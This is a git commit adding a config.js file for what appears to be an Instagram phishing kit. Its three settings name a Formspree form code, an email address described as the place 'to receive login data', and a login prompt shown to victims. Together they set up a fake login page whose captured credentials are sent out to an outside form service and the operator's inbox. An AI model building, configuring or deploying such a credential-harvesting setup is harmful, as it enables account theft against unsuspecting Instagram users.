74f8d0505638f6a40640f92df60425b7b0b6d82b
paterson-io <61858673+paterson-io@users.noreply.github.com>
2020-03-22 01:56:09 -0300

    Added files

---
+++ config.js
@@ -0,0 +1,3 @@
+var formspree_form_code = "xoqlpajb";  // Code to the formspree form: eg. https://formspree.io/xdodwqep
+var email = "fitte1953@fleckens.hu";  // The E-mail address to where you want to receive login data
+var custom_login_message = "Please login with Instagram to continue.";  // Specify a custom message to display on the login page
